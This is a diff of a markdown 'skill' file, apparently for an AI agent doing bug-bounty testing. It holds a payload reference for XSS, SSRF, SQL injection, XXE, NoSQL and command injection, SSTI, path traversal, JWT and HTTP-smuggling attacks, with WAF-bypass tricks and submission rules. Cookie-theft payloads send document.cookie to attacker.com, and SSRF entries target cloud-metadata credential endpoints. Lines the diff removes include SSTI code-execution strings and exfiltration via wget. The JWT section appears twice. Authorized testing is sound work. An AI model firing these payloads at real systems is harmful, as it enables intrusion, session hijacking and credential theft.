@@ -1,78 +1,113 @@
 ---
 name: security-arsenal
-description: Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, bypass techniques, or to check if a finding is submittable.
+description: Payload reference, bypass tables, WAF detection, conditionally-valid chains, and the NEVER SUBMIT list. Use when you need specific payloads, when validating findings, or when checking if a finding is submittable.
 ---
 
-# SECURITY ARSENAL
+# SECURITY ARSENAL — PAYLOADS, BYPASS, AND SUBMISSION RULES
 
-Payloads, bypass tables, wordlists, and submission rules.
+---
+
+## NEVER SUBMIT LIST
+
+These findings are NEVER valid alone. Do not waste time or program goodwill.
+
+```
+NEVER SUBMIT (standalone):
+  Missing CSP / HSTS / security headers
+  Missing SPF / DKIM / DMARC
+  GraphQL introspection alone (without auth bypass)
+  Banner / version disclosure without CVE exploit
+  Clickjacking on non-sensitive pages
+  Tabnabbing
+  CSV injection (no code execution)
+  CORS wildcard without credentialed exfil
+  Logout CSRF
+  Self-XSS
+  Open redirect alone (without OAuth chain)
+  OAuth client_secret in mobile app
+  SSRF DNS callback only (without internal access)
+  Host header injection alone (without reset poisoning)
+  Rate limit on non-critical forms
+  Session not invalidated on logout
+  Concurrent sessions
+  Internal IP in error message
+  Missing HttpOnly / Secure cookie flags alone
+  Server version disclosure
+  X-Powered-By header
+  Cookie without SameSite flag
+  HTML form without CSRF token (if no state change)
+  Auto-complete on password field
+  Clickjacking on login page
+```
+
+---
+
+## CONDITIONALLY VALID — CHAIN REQUIRED
+
+These findings are only valid when chained with something else.
+
+| Standalone Finding | Chain Required | Valid Result | Severity |
+|---|---|---|---|
+| Open redirect | + OAuth redirect_uri abuse | ATO | Critical |
+| Clickjacking | + sensitive action + PoC | Account actions | Medium |
+| CORS wildcard | + credentialed exfil | Data theft | High |
+| CSRF | + sensitive action (email change, password change) | ATO | High |
+| Rate limit bypass | + OTP brute succeeds | ATO | Medium/High |
+| SSRF DNS-only | + internal data return | Network exposure | Medium |
+| Host header injection | + password reset poisoning | ATO | High |
+| Prompt injection | + reads other user's data | Data breach | High |
+| S3 bucket listing | + JS bundles with secrets | Credential theft | Medium/High |
+| Self-XSS | + CSRF to trigger on victim | Session hijack | Medium |
+| Subdomain takeover | + OAuth redirect_uri chain | ATO | Critical |
+| GraphQL introspection | + auth bypass mutation | Data exfil | High |
 
 ---
 
 ## XSS PAYLOADS
 
 ### Basic Probes
+
 ```html
 <script>alert(document.domain)</script>
 <img src=x onerror=alert(document.domain)>
 <svg onload=alert(document.domain)>
 "><script>alert(1)</script>
-'><img src=x onerror=alert(1)>
+' ><img src=x onerror=alert(1)>
 javascript:alert(document.domain)
 ```
 
-### Cookie Theft (proof of impact)
+### Cookie Theft
+
 ```javascript
 <script>document.location='https://attacker.com/c?c='+document.cookie</script>
 <img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
 <script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
 ```
 
-### CSP Bypass Techniques
+### CSP Bypass
+
 ```javascript
-// If unsafe-inline blocked — use fetch/XHR
+// unsafe-inline blocked → use fetch/XHR
 <img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">
-// If script-src nonce present — find nonce reflection
+// nonce present → find nonce reflection
 <script nonce="NONCE_FROM_PAGE">alert(1)</script>
-// Angular template injection (bypasses many CSPs)
+// Angular template injection
 {{constructor.constructor('alert(1)')()}}
-// React dangerouslySetInnerHTML reflection
-// Vue v-html binding
-// mXSS (mutation-based XSS)
+// mXSS
 <noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
-// Polyglot
-'">><marquee><img src=x onerror=confirm(1)></marquee>
 ```
 
-### DOM XSS Sources and Sinks
+### DOM XSS Sources → Sinks
 
-**Sources** (user-controlled):
-```javascript
-location.hash, location.search, location.href, document.referrer, window.name, document.URL
-```
-
-**Sinks** (dangerous):
-```javascript
-innerHTML, outerHTML, document.write, eval, setTimeout (string form), setInterval,
-new Function, element.src (javascript: URI), element.href, location.href
-```
-
-### WAF Bypass for XSS
-```
-// Run waf_encoder.py or try these manually:
-<svg onload=eval(atob('YWxlcnQoMSk='))>
-<svg><animate onbegin=alert(1) attributeName=x dur=1s>
-<img src=x onerror="&#97;lert(1)">
-<a href="&#106;avascript:alert(1)">click</a>
-<details open ontoggle=alert(1)>
-<img src=x onerror=window.onerror=alert;throw+1>
-```
+**Sources**: `location.hash, location.search, location.href, document.referrer, window.name, document.URL`
+**Sinks**: `innerHTML, outerHTML, document.write, eval, setTimeout(string), setInterval(string), new Function, element.src, element.href`
 
 ---
 
 ## SSRF PAYLOADS
 
 ### Cloud Metadata
+
 ```bash
 # AWS
 http://169.254.169.254/latest/meta-data/
@@ -80,151 +115,81 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://169.254.169.254/latest/user-data/
 
 # GCP
-http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/
 # Header: Metadata-Flavor: Google
 
-# Azure IMDS
+# Azure
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
 # Header: Metadata: true
 ```
 
-### Internal Service Fingerprinting
-```bash
-http://localhost:6379     # Redis (unauthenticated)
-http://localhost:9200     # Elasticsearch (/_cat/indices)
-http://localhost:27017    # MongoDB
-http://localhost:2375     # Docker API — GET /containers/json
-http://localhost:8080     # Admin panel
-http://localhost:10.96.0.1:443  # Kubernetes API
-```
+### 11 IP Bypass Techniques
 
-### SSRF IP Bypass (11 Techniques)
-
-| Technique | Example | Notes |
-|-----------|---------|-------|
-| Decimal IP | `http://2130706433` | 127.0.0.1 as decimal |
-| Octal IP | `http://0177.0.0.1` | Octal 0177 = 127 |
-| Hex IP | `http://0x7f.0x0.0x0.0x1` | Hex representation |
-| Short IP | `http://127.1` | Abbreviated notation |
-| IPv6 | `http://[::1]` | Loopback in IPv6 |
-| IPv6 mapped | `http://[::ffff:127.0.0.1]` | IPv4-mapped IPv6 |
-| DNS rebinding | Attacker DNS → internal IP | First check = external, fetch = internal |
-| Redirect chain | External URL → 302 to internal | Check each hop |
-| URL parser confusion | `http://attacker.com#@internal` | Parser inconsistency |
-| CNAME to internal | Attacker domain → internal hostname | DNS points inward |
-| Rare format | `http://[::ffff:0x7f000001]` | Mixed hex IPv6 |
+| # | Technique | Example |
+|---|-----------|---------|
+| 1 | Decimal IP | `http://2130706433` |
+| 2 | Octal IP | `http://0177.0.0.1` |
+| 3 | Hex IP | `http://0x7f000001` |
+| 4 | Short IP | `http://127.1` |
+| 5 | IPv6 | `http://[::1]` |
+| 6 | IPv6 mapped | `http://[::ffff:127.0.0.1]` |
+| 7 | DNS rebinding | Attacker DNS → internal IP |
+| 8 | Redirect chain | External → 302 → internal |
+| 9 | URL parser confusion | `http://attacker.com#@internal` |
+| 10 | CNAME to internal | Attacker domain → internal hostname |
+| 11 | Full-width period | `http://127。0。0。1` |
 
 ---
 
 ## SQL INJECTION PAYLOADS
 
 ### Detection
+
 ```sql
 '
 ''
-`)
 '))
 ' OR '1'='1
 ' OR 1=1--
-' OR 1=1#
 ' UNION SELECT NULL--
-'; WAITFOR DELAY '0:0:5'--   -- MSSQL
-'; SELECT SLEEP(5)--         -- MySQL
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
 ' OR SLEEP(5)--
 ```
 
-### Union-Based (determine column count)
-```sql
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT 'a',NULL,NULL--
-```
+### WAF Bypass
 
-### Fingerprint + Prove Readable Data
 ```sql
--- MSSQL/MySQL
-0' UNION SELECT NULL,@@version,NULL--
--- PostgreSQL
-0' UNION SELECT NULL,version(),NULL--
--- Schema walk
-0' UNION SELECT NULL,TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES--
-```
-
-### Blind SQLi (time-based)
-```sql
--- MySQL
-' AND SLEEP(5)--
--- PostgreSQL
-' AND pg_sleep(5)--
--- MSSQL
-'; WAITFOR DELAY '0:0:5'--
--- Oracle
-' AND 1=dbms_pipe.receive_message('a',5)--
-```
-
-### WAF Bypass for SQLi
-```sql
-/*!50000 SELECT*/ * FROM users    -- MySQL inline comment
-SE/**/LECT * FROM users            -- comment injection
-SeLeCt * FrOm uSeRs              -- case variation
-%27 OR %271%27=%271               -- URL encoding
-ʼ OR ʼ1ʼ=ʼ1                      -- Unicode apostrophe
+/*!50000 SELECT*/ * FROM users
+SE/**/LECT * FROM users
+SeLeCt * FrOm uSeRs
+%27 OR %271%27=%271
 ```
 
 ---
 
 ## XXE PAYLOADS
 
-### Classic File Read
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <foo>&xxe;</foo>
 ```
 
-### Blind OOB via HTTP
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
-<foo>&xxe;</foo>
-```
-
-### Blind OOB via DNS + Data Exfil
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY % data SYSTEM "file:///etc/passwd">
-  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
-  %param1;
-]>
-<foo>&exfil;</foo>
-```
-
 ---
 
-## NOSQL INJECTION PAYLOADS (MongoDB)
+## NOSQL INJECTION
 
-### Operator Injection
 ```json
 {"username": {"$ne": null}, "password": {"$ne": null}}
 {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
-{"username": "admin", "password": {"$gt": ""}}
 {"$where": "this.username == 'admin'"}
-```
-
-### Auth Bypass One-Liners
-```bash
-curl -s -X POST https://target.com/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
 ```
 
 ---
 
-## COMMAND INJECTION PAYLOADS
+## COMMAND INJECTION
 
-### Basic Detection
 ```bash
 ; id
 | id
@@ -232,111 +197,32 @@ curl -s -X POST https://target.com/api/login \
 $(id)
 && id
 || id
-; sleep 5
-| sleep 5
-```
-
-### Blind OOB
-```bash
-; curl https://attacker.burpcollaborator.net
-; nslookup attacker.burpcollaborator.net
-$(nslookup attacker.burpcollaborator.net)
-; wget https://attacker.com/$(id|base64)
-```
-
-### Bypass Techniques
-```bash
-# Bypass space filter
-;{cat,/etc/passwd}
-;cat${IFS}/etc/passwd
-;IFS=,;cat,/etc/passwd
-
-# Bypass keyword filter
-;c'a't /etc/passwd
-;$(printf '\x63\x61\x74') /etc/passwd
 ```
 
 ---
 
-## SSTI DETECTION PAYLOADS (All Engines)
+## SSTI DETECTION
 
 ```
-{{7*7}}      → 49 = Jinja2 (Python) or Twig (PHP)
-${7*7}       → 49 = Freemarker (Java) or Spring EL
-<%= 7*7 %>   → 49 = ERB (Ruby) or EJS (Node.js)
-#{7*7}       → 49 = Mako (Python) or Pebble (Java)
+{{7*7}}      → 49 = Jinja2/Twig
+${7*7}       → 49 = Freemarker/Spring EL
+<%= 7*7 %>   → 49 = ERB/EJS
+#{7*7}       → 49 = Mako/Pebble
 *{7*7}       → 49 = Spring Thymeleaf
 {{7*'7'}}    → 7777777 = Jinja2 (not Twig)
 ```
 
-### RCE by Engine
-
-**Jinja2 (Python/Flask):**
-```python
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-```
-
-**Twig (PHP/Symfony):**
-```php
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-```
-
-**Freemarker (Java):**
-```
-${"freemarker.template.utility.Execute"?new()("id")}
-```
-
-**ERB (Ruby):**
-```ruby
-<%= `id` %>
-<%= system("id") %>
-```
-
-**Spring Thymeleaf:**
-```java
-${T(java.lang.Runtime).getRuntime().exec('id')}
-```
-
 ---
 
-## PATH TRAVERSAL PAYLOADS
+## PATH TRAVERSAL
 
 ```bash
 ../../../etc/passwd
 ....//....//....//etc/passwd
 ..%2F..%2F..%2Fetc%2Fpasswd
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
-..%252f..%252f..%252fetc%252fpasswd  # double URL encoding
-/etc/passwd%00.jpg                    # null byte truncation
-```
-
----
-
-## IDOR / AUTH BYPASS PAYLOADS
-
-### Horizontal Privilege Escalation
-```bash
-# Change numeric ID
-GET /api/user/123/profile → GET /api/user/124/profile
-# Change UUID
-GET /api/profile/a1b2c3d4-... → GET /api/profile/e5f6g7h8-...
-# HTTP method swap
-PUT /api/user/123 (protected) → DELETE /api/user/123 (not protected)
-# Old API version
-GET /v2/users/123 (protected) → GET /v1/users/123 (not protected)
-```
-
-### Vertical Privilege Escalation
-```bash
-# Parameter pollution
-POST /api/user/update
-{"role": "admin"}
-{"isAdmin": true}
-{"admin": 1}
-
-# GraphQL introspection → find admin mutations
-{"query": "{ __schema { types { name fields { name } } } }"}
+..%252f..%252f..%252fetc%252fpasswd
+/etc/passwd%00.jpg
 ```
 
 ---
@@ -344,19 +230,14 @@ POST /api/user/update
 ## JWT ATTACKS
 
 ```bash
-# None algorithm
-# Decode JWT, change alg to "none", remove signature
-
-# Secret bruteforce
-hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
-
-# RS256→HS256 algorithm confusion
-# If server uses RS256 (public key), try signing with HS256 using the PUBLIC key as secret
+# None algorithm: decode, change alg to "none", remove signature
+# Secret brute: hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+# RS256→HS256: sign with PUBLIC key as secret
 ```
 
 ---
 
-## HTTP SMUGGLING PAYLOADS
+## HTTP SMUGGLING
 
 ```http
 # CL.TE
@@ -386,7 +267,7 @@ SMUGGLED
 
 ## WAF BYPASS REFERENCE
 
-### Soft Block Detection (200 OK ≠ Bypass)
+### Soft Block Detection
 
 | WAF | Signature |
 |-----|-----------|
@@ -394,72 +275,31 @@ SMUGGLED
 | F5 BIG-IP | `200 OK` + "The requested URL was rejected" |
 | Imperva | `200 OK` + CAPTCHA page + `_Incapsula_Resource` |
 
-**401 and 500 are POSITIVE bypass signals:**
-- `401 Unauthorized` = you reached the auth middleware (past WAF edge)
-- `500 Internal Server Error` = payload triggered backend exception
+**401 and 500 are POSITIVE signals:**
+- `401` = you reached auth middleware (past WAF)
+- `500` = payload triggered backend exception
 
-### Universal Bypass Techniques
+### Universal Bypass
+
 ```bash
-# Double encoding
-%253Cscript%253E
-
-# Unicode
-%u003cscript%u003e
-
-# Case variation
-<ScRiPt>
-
-# Comments
-<scr/**/ipt>
-
-# Null bytes
-%00<script>
-
-# HTTP/2 smuggling
-# Switch to HTTP/2 in Burp, add Content-Length manually
+%253Cscript%253E    # Double encoding
+%u003cscript%u003e   # Unicode
+<ScRiPt>            # Case variation
+<scr/**/ipt>        # Comments
+%00<script>         # Null bytes
 ```
 
 ---
 
-## CONDITIONALLY VALID — CHAIN REQUIRED
+## JWT ATTACKS
 
-| Standalone Finding | Chain Required | Valid Result |
-|-------------------|----------------|--------------|
-| Open redirect | + OAuth redirect_uri | ATO (Critical) |
-| Clickjacking | + sensitive action + PoC | Medium |
-| CORS wildcard | + credentialed exfil | High |
-| CSRF | + sensitive action | High |
-| Rate limit bypass | + OTP brute succeeds | Medium/High |
-| SSRF DNS-only | + internal data return | Medium |
-| Host header injection | + password reset poisoning | High |
-| Prompt injection | + reads other user's data | High |
-| S3 bucket listing | + JS bundles with secrets | Medium/High |
-| Self-XSS | + CSRF to trigger on victim | Medium |
-| Subdomain takeover | + OAuth redirect_uri chain | Critical |
-| GraphQL introspection | + auth bypass mutation | High |
+```bash
+# None algorithm
+# Decode JWT, change alg to "none", remove signature
 
----
+# Secret bruteforce
+hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
 
-## NEVER SUBMIT LIST
-
-```
-Missing CSP / HSTS / security headers
-Missing SPF / DKIM / DMARC
-GraphQL introspection alone
-Banner / version disclosure without CVE exploit
-Clickjacking on non-sensitive pages
-Tabnabbing
-CSV injection (no code execution)
-CORS wildcard without credentialed exfil
-Logout CSRF
-Self-XSS
-Open redirect alone
-OAuth client_secret in mobile app
-SSRF DNS callback only
-Host header injection alone
-Rate limit on non-critical forms
-Session not invalidated on logout
-Concurrent sessions
-Internal IP in error message
-Missing HttpOnly / Secure cookie flags alone
+# RS256→HS256 algorithm confusion
+# If server uses RS256 (public key), try signing with HS256 using PUBLIC key as secret
 ```
